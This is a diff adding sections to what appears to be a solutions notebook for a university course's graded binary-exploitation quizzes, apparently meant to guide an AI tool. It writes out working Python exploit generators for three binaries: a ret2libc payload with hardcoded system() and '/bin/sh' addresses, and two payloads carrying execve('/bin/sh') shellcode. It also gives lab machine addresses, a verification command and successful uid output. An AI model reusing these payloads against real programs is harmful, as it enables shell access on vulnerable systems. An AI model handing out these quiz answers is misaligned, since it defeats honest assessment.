@@ -840,6 +840,102 @@ Always confirm via GDB batch — do not assume address matches a previous set.
 
 ---
 
+## ⚠️ IMPORTANT: LAST YEAR vs THIS YEAR (2025–2026)
+
+### All sets above (10A–10F) are from LAST YEAR
+
+The solved sets in sections 10A through 10F (out4, 1048972, regina, regina2, tasos) are from the **previous academic year**. Their libc addresses were obtained from **WSL2 Ubuntu** (`libc6-i386`), NOT from the lab machine:
+
+| Symbol | WSL2 address (last year) | Lab machine address (this year) |
+|--------|--------------------------|----------------------------------|
+| `system()` | `0xb7dd58e0` | `0xb7dffd30` |
+| `"/bin/sh"` | `0xb7f42de8` | `0xb7f40caa` |
+
+**These addresses are different.** Never reuse last year's libc addresses for this year's binaries. Always get them fresh from the lab machine via GDB as shown in LLM_INSTRUCTIONS.md.
+
+### This year's quiz pattern (2025–2026): more shellcode bins
+
+Last year: typically 1 RWE bin (bin.2) + rest NX (ret2libc).
+This year (lefteris/nektarios): **2 out of 3 bins are RWE shellcode** (bin.2 and bin.3), only bin.1 is NX/ret2libc.
+
+Each bin also has a **different `lea` offset** — do not assume offset=52 like last year. Always read the disassembly.
+
+---
+
+### 10G. LEFTERIS SET — Solved (2026-04-03) ✓
+
+> Confirmed `uid=9992(apieri01)` on all 3 via SSH on lab machine. **Addresses are from lab machine directly.**
+> Generated using tailored Python script `solve_lefteris.py` (Tier 1 fast path).
+
+**Classification (bin.0 is PIE warm-up — skip):**
+
+| Binary | GNU_STACK | lea offset | Attack |
+|--------|-----------|------------|--------|
+| bin.0 | RW, ET_DYN (PIE) | — | Warm-up, skip |
+| bin.1 | RW (NX on) | `-0x2a` → offset=**46** | Ret2libc |
+| bin.2 | RWE | `-0x2c` → offset=**48** | Shellcode |
+| bin.3 | RWE | `-0x28` → offset=**44** | Shellcode |
+
+**Libc addresses — from lab machine (`10.16.13.89`, Rocky Linux i686, TEMP=1000):**
+```
+system()   = 0xb7dffd30
+"/bin/sh"  = 0xb7f40caa
+```
+
+**buf_addr — from GDB batch on lab machine (break at `0x804933c`, `p/x $ebp - N`):**
+```
+bin.2 buf_addr = 0xbfffdbdc   (ebp - 0x2c)
+bin.3 buf_addr = 0xbfffdbe0   (ebp - 0x28)
+```
+
+**bin.1 — ret2libc (OFFSET=46, 58 bytes)**
+```python
+import struct
+def p32(v): return struct.pack('<I', v)
+payload = b'A'*46 + p32(0xb7dffd30) + p32(0xdeadbeef) + p32(0xb7f40caa)
+with open('exploit.1','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
+```
+
+**bin.2 — shellcode (OFFSET=48, 52 bytes)**
+```python
+import struct
+sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
+payload = sc + b'A'*(48-len(sc)) + struct.pack('<I', 0xbfffdbdc)
+with open('exploit.2','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
+```
+
+**bin.3 — shellcode (OFFSET=44, 48 bytes)**
+```python
+import struct
+sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
+payload = sc + b'A'*(44-len(sc)) + struct.pack('<I', 0xbfffdbe0)
+with open('exploit.3','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
+```
+
+**Verification (lab machine):**
+```bash
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
+```
+- `=== BIN 1 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+- `=== BIN 2 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+- `=== BIN 3 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+
+---
+
+### 10H. NEKTARIOS SET — Solved (2026-04-03) ✓
+
+> **Identical binaries to lefteris** (same BuildIDs: bin.1=`9d5944c7`, bin.2=`c66c02a8`, bin.3=`f394a776`). All addresses, offsets, and exploit payloads are identical.
+> Generated using tailored Python script `solve_nektarios.py` (Tier 1 fast path).
+
+See section 10G for all addresses and payloads — they apply unchanged to the nektarios set.
+
+**Verification (lab machine, same binaries):**
+- `=== BIN 1 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+- `=== BIN 2 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+- `=== BIN 3 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
+
+---
+
 ## 11. GENERAL GDB COMMANDS REFERENCE
 
 ```bash
